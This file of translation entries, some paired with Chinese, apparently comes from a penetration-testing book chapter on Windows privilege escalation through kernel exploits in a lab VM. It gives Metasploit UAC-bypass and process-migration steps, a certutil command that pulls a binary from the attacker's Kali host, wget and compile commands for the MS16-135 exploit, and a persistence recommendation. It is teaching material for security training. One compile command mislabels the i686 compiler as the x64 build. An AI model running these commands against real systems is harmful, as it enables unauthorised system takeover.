- en: '*Chapter 5*: Windows Kernel Exploits'
  id: totrans-0
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Now that we have learned how to enumerate important information from our target
    system and have identified potential privilege escalation attack vectors, we can
    begin the privilege escalation process on Windows. The first privilege escalation
    attack vector we will be exploring is **kernel exploitation**.
  id: totrans-1
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, you will learn how to identify, transfer, and utilize kernel
    exploits on Windows both manually and automatically.
  id: totrans-2
  prefs: []
  type: TYPE_NORMAL
- en: You will learn how a kernel works and how you can leverage kernel vulnerabilities
    to elevate your privileges on the target system. This is a vital part of the privilege
    escalation process as kernel vulnerabilities provide a straightforward way of
    elevating your privileges on a target system.
  id: totrans-3
  prefs: []
  type: TYPE_NORMAL
- en: 'In this chapter, we''re going to cover the following main topics:'
  id: totrans-4
  prefs: []
  type: TYPE_NORMAL
- en: Understanding kernel exploits
  id: totrans-5
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Kernel exploitation with Metasploit
  id: totrans-6
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Manual kernel exploitation
  id: totrans-7
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: Technical requirements
  id: totrans-8
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: To follow along with the demonstrations in this chapter, you will need to ensure
    that you have familiarity with Windows CMD commands.
  id: totrans-9
  prefs: []
  type: TYPE_NORMAL
- en: 'You can view this chapter''s code in action here: [https://bit.ly/3m7qa47](https://bit.ly/3m7qa47)'
  id: totrans-10
  prefs: []
  type: TYPE_NORMAL
- en: Understanding kernel exploits
  id: totrans-11
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: Before we can get started with utilizing various kernel exploits on Windows,
    it is vitally important to understand what a kernel is and how it is set up and
    configured.
  id: totrans-12
  prefs: []
  type: TYPE_NORMAL
- en: This will give you a clearer picture of how and why kernels are exploited and
    how they can be exploited to elevate privileges on Windows.
  id: totrans-13
  prefs: []
  type: TYPE_NORMAL
- en: Let's begin by understanding what a kernel is and what functions it serves in
    the context of an operating system.
  id: totrans-14
  prefs: []
  type: TYPE_NORMAL
- en: What is a kernel?
  id: totrans-15
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: A kernel is a computer program that is the core of an operating system and has
    complete control over every resource and hardware on a system. It acts as a translation
    layer between hardware and software and facilitates the communication between
    these two layers.
  id: totrans-16
  prefs: []
  type: TYPE_NORMAL
- en: The kernel runs in system memory and is loaded immediately after the bootloader
    during the system startup process and is responsible for handling the remaining
    startup procedures for the operating system.
  id: totrans-17
  prefs: []
  type: TYPE_NORMAL
- en: 'The kernel is responsible for performing the following main functions:'
  id: totrans-18
  prefs: []
  type: TYPE_NORMAL
- en: '**Memory management**: The kernel is responsible for reading to, writing to,
    allocating, and deallocating system memory.'
  id: totrans-19
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Device management**: The kernel is responsible for managing and facilitating
    the I/O operations between the hardware peripherals and the operating system.'
  id: totrans-20
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**I/O management**: The kernel is responsible for facilitating and managing
    the I/O operations between system resources such as the CPU and system memory.'
  id: totrans-21
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: '**Resource management**: The kernel is responsible for managing the allocation
    and sharing of memory between various programs and processes.'
  id: totrans-22
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
- en: 'As illustrated in the following diagram, the kernel acts as an intermediary
    between hardware and software and facilitates and translates their interaction:'
  id: totrans-23
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 5.1 – Kernel structure'
  id: totrans-24
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_05_001.jpg)'
  id: totrans-25
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5.1 – Kernel structure
  id: totrans-26
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.1 – 内核结构
- en: Now that we have a clear understanding of what a kernel is, what its functions
    are, and its role in an operating system, it becomes clear that a vulnerability
    within the kernel can be exploited and can potentially lead to privileged access
    and control over a system. It is for this reason that kernel exploits are valued
    by attackers during the privilege escalation process, as they offer a straightforward
    path for elevating privileges.
  id: totrans-27
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经清楚了解了什么是内核、它的功能以及在操作系统中的作用，我们可以清楚地看到，内核中的漏洞可能被利用，进而导致对系统的特权访问和控制。正因如此，攻击者在特权升级过程中看重内核漏洞利用，因为它们提供了一个简单的路径来提升权限。
- en: It is to be noted, however, that kernel exploits can be unstable and may lead
    to system crashes and therefore need to be executed with tact and care. This is
    primarily because kernel exploits target the kernel and its functionality, therefore
    interfering with the core operation of the operating system as a whole. Consequently,
    system crashes caused by kernel exploits can lead to data loss and damage the
    operating system as a whole, which can become a liability during a penetration
    test.
  id: totrans-28
  prefs: []
  type: TYPE_NORMAL
  zh: 然而需要注意的是，内核漏洞利用可能不稳定，并可能导致系统崩溃，因此需要谨慎操作。这主要是因为内核漏洞利用会针对内核及其功能，进而干扰操作系统的核心操作。因此，由内核漏洞引发的系统崩溃可能导致数据丢失，并损坏整个操作系统，在渗透测试过程中可能成为一种风险。
- en: Let's take a brief look at the Windows kernel and how it is structured to get
    an understanding of how it functions.
  id: totrans-29
  prefs: []
  type: TYPE_NORMAL
  zh: 让我们简要了解一下Windows内核及其结构，以便理解它是如何工作的。
- en: Windows NT
  id: totrans-30
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows NT
- en: 'Windows NT is the kernel that comes pre-packaged with all versions of Microsoft
    Windows and operates like a traditional kernel with a few exceptions based on
    user design philosophy. It consists of two main modes of operation that determine
    access to system resources and hardware:'
  id: totrans-31
  prefs: []
  type: TYPE_NORMAL
  zh: Windows NT是所有版本的Microsoft Windows自带的内核，像传统内核一样运行，但基于用户设计理念有所不同。它由两种主要的操作模式组成，这些模式决定了对系统资源和硬件的访问：
- en: '**User mode**: Programs and services running in user mode have limited access
    to system resources and functionality.'
  id: totrans-32
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**用户模式**：在用户模式下运行的程序和服务只能有限地访问系统资源和功能。'
- en: '**Kernel mode**: Kernel mode has unrestricted access to system resources and
    functionality with the added functionality of managing devices and system memory.'
  id: totrans-33
  prefs:
  - PREF_UL
  type: TYPE_NORMAL
  zh: '**内核模式**：内核模式对系统资源和功能拥有无限制的访问权限，还具备管理设备和系统内存的功能。'
- en: 'As illustrated in the following diagram, the two main modes of operation are
    used to segregate access to resources and hardware:'
  id: totrans-34
  prefs: []
  type: TYPE_NORMAL
  zh: 如下图所示，主要有两种操作模式，用于隔离对资源和硬件的访问：
- en: '![Figure 5.2 – Windows kernel structure'
  id: totrans-35
  prefs: []
  type: TYPE_NORMAL
  zh: '![图5.2 – Windows内核结构'
- en: '](Images/B17389_05_002.jpg)'
  id: totrans-36
  prefs: []
  type: TYPE_NORMAL
  zh: '](Images/B17389_05_002.jpg)'
- en: Figure 5.2 – Windows kernel structure
  id: totrans-37
  prefs: []
  type: TYPE_NORMAL
  zh: 图5.2 – Windows内核结构
- en: User mode consists of system-defined processes that communicate with the kernel
    through the use of Windows APIs. The processes running in user mode can also communicate
    with devices by sending I/O requests to the kernel-mode device drivers as highlighted
    in *Figure 5.2*.
  id: totrans-38
  prefs: []
  type: TYPE_NORMAL
  zh: 用户模式包括与内核通过Windows API通信的系统定义进程。运行在用户模式中的进程还可以通过向内核模式设备驱动程序发送I/O请求与设备通信，如*图5.2*所示。
- en: Kernel mode has access to all devices and system resources and is also responsible
    for preventing user-mode services from interacting with and accessing functionality
    that they do not have access to.
  id: totrans-39
  prefs: []
  type: TYPE_NORMAL
  zh: 内核模式可以访问所有设备和系统资源，并且负责防止用户模式服务与其无权访问的功能进行交互和访问。
- en: Now that we have an understanding of how the Windows kernel functions and how
    it is structured, we can begin to delve into the Windows kernel exploitation process.
  id: totrans-40
  prefs: []
  type: TYPE_NORMAL
  zh: 现在我们已经了解了Windows内核的功能和结构，我们可以开始深入探讨Windows内核漏洞利用过程。
- en: The Windows kernel exploitation process
  id: totrans-41
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
  zh: Windows内核漏洞利用过程
- en: The Windows operating system is vulnerable to various attacks that can lead
    to exploitation or privilege escalation. We have already explored the process
    of identifying these vulnerabilities and their corresponding exploits in the previous
    chapter. In this chapter, we will be primarily focusing on how to correctly identify
    and exploit unpatched and vulnerable Windows systems to elevate our privileges.
  id: totrans-42
  prefs: []
  type: TYPE_NORMAL
  zh: Windows操作系统容易受到各种攻击，可能导致漏洞利用或特权升级。我们已经在上一章中探讨了如何识别这些漏洞及其相应的漏洞利用。在本章中，我们将重点讨论如何正确识别和利用未打补丁的脆弱Windows系统来提升我们的特权。
- en: This process will follow a two-pronged approach that will encompass the process
    of utilizing kernel exploits both manually and automatically.
  id: totrans-43
  prefs: []
  type: TYPE_NORMAL
- en: Kernel exploits on Windows will typically target vulnerabilities in the Windows
    kernel to execute arbitrary code in order to run privileged system commands or
    to obtain a system shell. This process will differ based on the version of Windows
    being targeted and the kernel exploit being used.
  id: totrans-44
  prefs: []
  type: TYPE_NORMAL
- en: In this chapter, we will be using the **Windows 7 SP1** target virtual machine
    in our virtual hacking lab.
  id: totrans-45
  prefs: []
  type: TYPE_NORMAL
- en: We can now begin the kernel exploitation process with the Metasploit framework.
    This will allow us to automate the process of identifying and exploiting kernel
    vulnerabilities on Windows.
  id: totrans-46
  prefs: []
  type: TYPE_NORMAL
- en: Kernel exploitation with Metasploit
  id: totrans-47
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: We can begin the kernel exploitation process by taking a look at how to use
    kernel exploits with the **Metasploit** framework. The Metasploit framework will
    offer an automated and modularized solution and will streamline the exploitation
    process.
  id: totrans-48
  prefs: []
  type: TYPE_NORMAL
- en: 'For this section, our target system will be the Windows SP1 virtual machine.
    As a prerequisite, ensure that you have gained your initial foothold on the system
    and have a **Meterpreter** session:'
  id: totrans-49
  prefs: []
  type: TYPE_NORMAL
- en: The first step involves scanning the target for potential exploits. We will
    be using the **local_exploit_suggester** module. This process was covered in depth
    in the previous chapter.
  id: totrans-50
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'We can load the module in Metasploit by running the following command:'
  id: totrans-51
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**use post/multi/recon/local_exploit_suggester**'
  id: totrans-52
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'After loading the module, you will need to set the **SESSION** option for the
    module. The **SESSION** option requires the session ID of your Meterpreter session.
    This can be done by running the following command:'
  id: totrans-53
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**set SESSION <SESSION-ID>**'
  id: totrans-54
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As illustrated in the following screenshot, the **SESSION** option should reflect
    the session ID you set:'
  id: totrans-55
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.3 – local_exploit_suggester options](Images/B17389_05_003.jpg)'
  id: totrans-56
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: Figure 5.3 – local_exploit_suggester options
  id: totrans-57
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'After configuring the module options, we can run the module by running the
    following command:'
  id: totrans-58
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**run**'
  id: totrans-59
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'This will begin the scanning process. During the process, the module will begin
    to output the various exploits that the target is potentially vulnerable to as
    highlighted in the following screenshot:'
  id: totrans-60
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.4 – local_exploit_suggester results'
  id: totrans-61
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_004.jpg)'
  id: totrans-62
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.4 – local_exploit_suggester results
  id: totrans-63
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can begin testing the various exploit modules recommended by **local_exploit_suggester**.
    The first few modules in the output usually have a higher chance of working successfully.
    We can test the first module in the list as highlighted in *Figure 5.4* by loading
    the module. This can be done by running the following command:'
  id: totrans-64
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**use /exploit/windows/local/bypassuac_eventvwr**'
  id: totrans-65
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This kernel exploit module will bypass **User Access Control** (**UAC**) and
    insert a command in the Windows Registry that will be executed when the Windows
    Event Viewer is launched and will spawn a system shell – in this case, a Meterpreter
    session.
  id: totrans-66
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note
  id: totrans-67
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This exploit does not exploit a vulnerability in the kernel, as it interacts
    and stores commands in the Windows Registry.
  id: totrans-68
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'More information regarding this exploit module can be found here: [https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/.](https://www.rapid7.com/db/modules/exploit/windows/local/bypassuac_eventvwr/%20)'
  id: totrans-69
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: After loading the module, you will need to set the module options, which will
    include the Meterpreter session ID and the payload options for the new Meterpreter
    session as highlighted in the following screenshot:![Figure 5.5 – Kernel exploit
    module options](Images/B17389_05_005.jpg)
  id: totrans-70
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: Figure 5.5 – Kernel exploit module options
  id: totrans-71
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can now run the kernel exploit module by running the following command:'
  id: totrans-72
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**exploit**'
  id: totrans-73
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'In this case, the exploit is successful, as seen in the following screenshot.
    As a result, we will get a Meterpreter session with elevated privileges:'
  id: totrans-74
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.6 – Exploit successful'
  id: totrans-75
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_006.jpg)'
  id: totrans-76
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.6 – Exploit successful
  id: totrans-77
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can now enumerate the privileges we have on the system by running the following
    command:'
  id: totrans-78
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**getuid**'
  id: totrans-79
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The output is as shown in the following screenshot:'
  id: totrans-80
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.7 – Meterpreter privileges'
  id: totrans-81
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_007.jpg)'
  id: totrans-82
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.7 – Meterpreter privileges
  id: totrans-83
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As shown in the preceding screenshot, we do not yet have elevated privileges,
    however, we can list out the privileges we have on the current Meterpreter session
    by running the following command:'
  id: totrans-84
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**getprivs**'
  id: totrans-85
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The output is as shown in the following screenshot:'
  id: totrans-86
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.8 – Meterpreter privileges'
  id: totrans-87
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_008.jpg)'
  id: totrans-88
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.8 – Meterpreter privileges
  id: totrans-89
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: As shown in the preceding screenshot, this Meterpreter session has administrative
    privileges and we can migrate to an **NT AUTHORITY/SYSTEM**process.
  id: totrans-90
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can enumerate the running processes by running the following command:'
  id: totrans-91
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**ps**'
  id: totrans-92
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'This command will output a list of running processes, their respective process
    IDs, and the process owner, as shown in the following screenshot:'
  id: totrans-93
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.9 – Meterpreter processes ](Images/B17389_05_009.jpg)'
  id: totrans-94
  prefs:
  - PREF_IND
  type: TYPE_IMG
- en: Figure 5.9 – Meterpreter processes
  id: totrans-95
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can migrate to the **winlogon.exe** process as it is owned by the **NT AUTHORITY/SYSTEM**
    user. This can be done by running the following command:'
  id: totrans-96
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**migrate <PID>**'
  id: totrans-97
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'After successful migration, we can recheck our privileges by running the **getuid**
    command or the **whoami** command within a system shell:'
  id: totrans-98
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.10 – Successful privilege escalation](Images/B17389_05_010.jpg)'
  id: totrans-99
  prefs: []
  type: TYPE_IMG
- en: Figure 5.10 – Successful privilege escalation
  id: totrans-100
  prefs: []
  type: TYPE_NORMAL
- en: As shown in the preceding screenshot, we have successfully elevated our privileges
    and can run system commands and access any resource on the system.
  id: totrans-101
  prefs: []
  type: TYPE_NORMAL
- en: We now have elevated privileges on the system and can begin performing post-exploitation
    procedures. It is recommended to set up persistence for the elevated Meterpreter
    session in the event the process is killed or the system is shut down.
  id: totrans-102
  prefs: []
  type: TYPE_NORMAL
- en: This process will differ depending on the type of exploit module and the type
    of attack being performed, however, the process will remain similar when using
    the Metasploit framework.
  id: totrans-103
  prefs: []
  type: TYPE_NORMAL
- en: The kernel exploitation process with Metasploit is much more streamlined as
    a lot of the steps can be automated, however, you might be in a situation where
    you only have access via a standard shell as opposed to a Meterpreter session.
    This is where manual kernel exploitation comes into play.
  id: totrans-104
  prefs: []
  type: TYPE_NORMAL
- en: Manual kernel exploitation
  id: totrans-105
  prefs:
  - PREF_H1
  type: TYPE_NORMAL
- en: In some cases, you will not have access to a target with a Meterpreter session
    or you may have exploited the target through a manual exploitation technique such
    as a web shell. In that event, you will have access through a standard reverse
    shell most likely facilitated through **netcat**. This poses a few issues; how
    can I scan the target for potential kernel exploits? And how can I transfer over
    the kernel exploit to the target?
  id: totrans-106
  prefs: []
  type: TYPE_NORMAL
- en: These are the issues we will be addressing in this section; our target of choice
    will be the Windows 7 virtual machine.
  id: totrans-107
  prefs: []
  type: TYPE_NORMAL
- en: Local enumeration
  id: totrans-108
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: The first step is to scan and identify potential kernel vulnerabilities. This
    can be done through the use of the **Windows-Exploit-Suggester** tool or other
    enumeration scripts and tools. In this case, we will utilize the **winPEAS** binary
    to enumerate information from our target.
  id: totrans-109
  prefs: []
  type: TYPE_NORMAL
- en: Note
  id: totrans-110
  prefs: []
  type: TYPE_NORMAL
- en: winPEAS is a local Windows enumeration script that searches and scans for potential
    vulnerabilities and enumerates all important system information that can be used
    to stage a privilege escalation attack.
  id: totrans-111
  prefs: []
  type: TYPE_NORMAL
- en: 'The **winPEAS** binary can be downloaded from the GitHub repository here: [https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe.](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS/winPEASexe%20)'
  id: totrans-112
  prefs: []
  type: TYPE_NORMAL
- en: 'Ensure you download the correct binary based on the architecture of your target
    operating system; the architecture-specific binaries can be found in the **binaries**
    folder as highlighted in the following screenshot:'
  id: totrans-113
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 5.11 – winPEAS binaries'
  id: totrans-114
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_05_011.jpg)'
  id: totrans-115
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5.11 – winPEAS binaries
  id: totrans-116
  prefs: []
  type: TYPE_NORMAL
- en: After downloading the binary to our Kali VM, we need to transfer the **winPEAS.exe**
    binary to our target virtual machine. This cannot be done automatically as we
    do not have a Meterpreter session. As a result, we will need to make use of Windows-specific
    utilities to download the binary.
  id: totrans-117
  prefs: []
  type: TYPE_NORMAL
- en: Transferring files
  id: totrans-118
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'In order to transfer the **winPEAS.exe** binary to our target, we will need
    to set up a web server on our Kali VM that will be used to host the binary so
    that we can download it on the target system. This can be done by following the
    procedure outlined here:'
  id: totrans-119
  prefs: []
  type: TYPE_NORMAL
- en: 'To set up a web server on our Kali VM, we can utilize the **SimpleHTTPServer**
    Python module to serve the binary file. This can be done by running the following
    command in the directory where the **winPEAS.exe** binary is stored:'
  id: totrans-120
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-121
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Note
  id: totrans-122
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**SimpleHTTPServer** is a Python module for both Python 2 and Python 3.'
  id: totrans-123
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As highlighted in the following screenshot, the **SimpleHTTPServer** module
    will serve the files in the directory on the Kali VM IP address on port **80**:'
  id: totrans-124
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.12 – SimpleHTTPServer'
  id: totrans-125
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_012.jpg)'
  id: totrans-126
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.12 – SimpleHTTPServer
  id: totrans-127
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'In order to download the **winPEAS.exe** binary onto the target system, we
    can utilize the **certutil** utility. Before we can download the binary, however,
    we need to navigate to a directory where we have read and write permissions. In
    this case, we will navigate to the current user''s desktop as illustrated in the
    following screenshot:'
  id: totrans-128
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 5.13 – Default user directory](Images/B17389_05_013.jpg)'
  id: totrans-129
  prefs: []
  type: TYPE_IMG
- en: Figure 5.13 – Default user directory
  id: totrans-130
  prefs: []
  type: TYPE_NORMAL
- en: 'We can now use the **certutil** utility to download the binary from the Kali
    VM to our target system. This can be done by running the following command on
    the target system:'
  id: totrans-131
  prefs: []
  type: TYPE_NORMAL
- en: '**certutil -urlcache -f http://<KALI-VM>/winPEASx64.exe winPEAS.exe**'
  id: totrans-132
  prefs: []
  type: TYPE_NORMAL
- en: 'The output for this command can be seen in the following screenshot:'
  id: totrans-133
  prefs: []
  type: TYPE_NORMAL
- en: '![Figure 5.14 – certutil successful transfer'
  id: totrans-134
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_05_014.jpg)'
  id: totrans-135
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5.14 – certutil successful transfer
  id: totrans-136
  prefs: []
  type: TYPE_NORMAL
- en: As shown in the preceding screenshot, if the transfer is successful, the binary
    should be downloaded and saved with the name we specified.
  id: totrans-137
  prefs: []
  type: TYPE_NORMAL
- en: We can now use the winPEAS binary to enumerate potential kernel vulnerabilities
    that we can use to elevate our privileges.
  id: totrans-138
  prefs: []
  type: TYPE_NORMAL
- en: Enumerating kernel exploits
  id: totrans-139
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'The winPEAS binary enumerates a lot of information and will perform various
    checks to discover potential vulnerabilities. In the context of kernel exploits,
    we only need to enumerate the system information. This can be done by going through
    the procedure outlined as follows:'
  id: totrans-140
  prefs: []
  type: TYPE_NORMAL
- en: 'To enumerate all important system information, we need to run the **winPEAS.exe**
    binary with the following parameter:'
  id: totrans-141
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**.\winPEAS.exe systeminfo**'
  id: totrans-142
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As shown in the following screenshot, the binary will enumerate system information
    and, based on the build version and the hotfixes installed, it will output a list
    of kernel exploits that can be used to elevate privileges:'
  id: totrans-143
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.15 – winPEAS kernel exploits'
  id: totrans-144
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_015.jpg)'
  id: totrans-145
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.15 – winPEAS kernel exploits
  id: totrans-146
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'We can also utilize the **Windows-Exploit-Suggester** tool to enumerate our
    system information and scan for potential kernel exploits. This can be done by
    running the following command:'
  id: totrans-147
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**./windows-exploit-suggester.py -–database <database>.xlsx -–systeminfo <systeminfo>.txt**'
  id: totrans-148
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'The **Windows-Exploit-Suggester** script can be downloaded from this link:
    [https://github.com/AonCyberLabs/Windows-Exploit-Suggester.](https://github.com/AonCyberLabs/Windows-Exploit-Suggester%20)'
  id: totrans-149
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'As outlined in the following screenshot, the script will enumerate all potential
    kernel exploits that can be used to elevate privileges. We can now use this information
    to determine the correct kernel exploit to use:'
  id: totrans-150
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '![Figure 5.16 – Windows-Exploit-Suggester kernel exploits'
  id: totrans-151
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '](Images/B17389_05_016.jpg)'
  id: totrans-152
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: Figure 5.16 – Windows-Exploit-Suggester kernel exploits
  id: totrans-153
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'It is always recommended to use the first exploits output by the enumeration
    tools and scripts. In this case, we will start off with the **MS16-135** kernel
    exploit. We will need to determine more information about the exploit and how
    it should be used. We can do this by performing a quick Google search as highlighted
    in the following screenshot:'
  id: totrans-154
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '![Figure 5.17 – MS16-135 exploit search'
  id: totrans-155
  prefs: []
  type: TYPE_NORMAL
- en: '](Images/B17389_05_017.jpg)'
  id: totrans-156
  prefs: []
  type: TYPE_NORMAL
- en: Figure 5.17 – MS16-135 exploit search
  id: totrans-157
  prefs: []
  type: TYPE_NORMAL
- en: The Google search reveals a GitHub repository that contains information regarding
    the exploit, the exploit source code, and how it should be used.
  id: totrans-158
  prefs: []
  type: TYPE_NORMAL
- en: It is always recommended to analyze the source code to ensure that it is not
    malicious and works as intended to make any additional modifications required.
    Let's take a look at how to compile a Windows exploit from source.
  id: totrans-159
  prefs: []
  type: TYPE_NORMAL
- en: Compiling Windows exploits
  id: totrans-160
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'The ability to modify and compile exploits is extremely important as it allows
    you to ensure the exploit works as intended and provides you with the flexibility
    to make modifications to the exploit as per your requirements. In this case, we
    will be taking a look at how to compile the exploit code into a binary manually:'
  id: totrans-161
  prefs: []
  type: TYPE_NORMAL
- en: 'To begin with, we must ensure that our Kali Linux VM has all the necessary
    build tools required for compiling Windows binaries. This can be done by running
    the following command:'
  id: totrans-162
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**sudo apt install mingw-w64**'
  id: totrans-163
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'You will now need to download the exploit code to the Kali VM. This can either
    be done directly or through the **wget** utility as follows:'
  id: totrans-164
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**wget https://raw.githubusercontent.com/SecWiki/windows-kernel-exploits/master/MS16-135/41015.c**'
  id: totrans-165
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: We can now begin the compilation process, however, based on the target system's
    architecture, we will need to compile the source code differently.
  id: totrans-166
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: 'For x64-based operating systems, run the following command, and substitute
    the parameters with your own files and output names:'
  id: totrans-167
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe**'
  id: totrans-168
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: 'If the target is a 32-bit system, run the following command:'
  id: totrans-169
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: '**i686-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32**'
  id: totrans-170
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
- en: This will compile the exploit into a binary that we can then transfer over to
    our target to be executed.
  id: totrans-171
  prefs: []
  type: TYPE_NORMAL
- en: Running the kernel exploit
  id: totrans-172
  prefs:
  - PREF_H2
  type: TYPE_NORMAL
- en: 'After successful compilation of the exploit code, we can transfer over the
    compiled binary to the target system and execute it based on the instructions
    provided in the documentation of the exploit. This can be done by following the
    procedures outlined as follows:'
  id: totrans-173
  prefs: []
  type: TYPE_NORMAL
- en: 'In this particular case, the execution of the kernel exploit binary is straightforward
    and only requires the specification of the target operating system version. Before
    we can execute it, we need to transfer the exploit over to the target. This can
    be done by starting a local web server on the Kali VM with the **SimpleHTTPServer**
    Python module:'
  id: totrans-174
  prefs:
  - PREF_OL
  type: TYPE_NORMAL
- en: '**sudo python -m SimpleHTTPServer 80**'
  id: totrans-175
  prefs:
  - PREF_IND
  type: TYPE_NORMAL
